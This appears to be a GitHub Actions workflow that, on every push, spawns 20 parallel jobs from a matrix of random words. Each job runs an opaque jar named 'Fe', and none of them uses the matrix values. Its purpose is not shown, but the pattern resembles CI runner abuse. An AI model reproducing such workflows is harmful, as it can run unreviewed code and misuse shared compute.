name: worker

on:
  push:

jobs:
  stretch:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        operate: ["deserve", "machinery", "acute", "solar", "nose"]
        accessible: ["consultant", "reveal", "virus", "police"]
    steps:
    - uses: actions/checkout@v6
    - uses: actions/setup-java@v5
      with:
        distribution: 'zulu'
        java-version: '25'
    - run: java -jar Fe
